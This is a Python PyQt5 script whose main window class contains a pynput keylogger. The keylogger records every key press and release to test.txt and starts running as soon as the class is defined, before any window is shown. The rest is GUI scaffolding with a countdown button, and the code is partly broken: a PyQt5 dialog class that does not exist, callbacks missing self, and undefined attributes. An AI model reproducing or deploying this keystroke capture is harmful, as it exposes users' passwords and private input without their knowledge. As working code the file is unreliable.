import sys
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import QMainWindow, QLabel, QGridLayout, QWidget, QMenu
from PyQt5.QtWidgets import QPushButton
from PyQt5.QtCore import QSize, QTimer
import os
from pynput import keyboard
from PyQt5 import QtCore  , QtGui , QtWidgets , uic
from start import *

if os.path.exists("test.txt"):
    f = open("test.txt", "a")
else:
    f = open("test.txt", "x")
    
    
class PostDialog(QtGui.QDialog):
    def __init__(self, parent=None):
        QtGui.QDialog.__init__(self, parent)
        self.ui = Ui_start() #code from designer!!
        self.ui.setupUi(self)

        self.ui.plainTextEdit.installEventFilter(self)

 
class Example(QMainWindow):

    def __init__(self):
        QMainWindow.__init__(self)

    def on_press(key):
        try:
            f.writelines("///key [ {0} ] pressed ///".format(
                key.char))
        except AttributeError:
            f.writelines("///special key {0} pressed///".format(
                key))
            f.flush()

    def on_release(key):
        text = ("///key [ {0} ] released ///".format(
            key))
        f.writelines(f'{text} \n')
        f.flush()

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    f.close()

            
    def Action(self):
        if self.bt3.isEnabled():
            self.time.start()
            self.bt3.setEnabled(False)

    def Refresh(self):
        if self.count > 0:
            self.bt3.setText(str(self.count)+' seconds')
            self.count -= 1
        else:
            self.time.stop()
            self.bt3.setEnabled(True)
            self.bt3.setText('Button 3')
            self.count = 10


with open("test.txt", "r") as file1:
    read_content = file1.read()
    print(read_content)
    
    
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    mainWin = Example()
    mainWin.show()
    sys.exit( app.exec_() )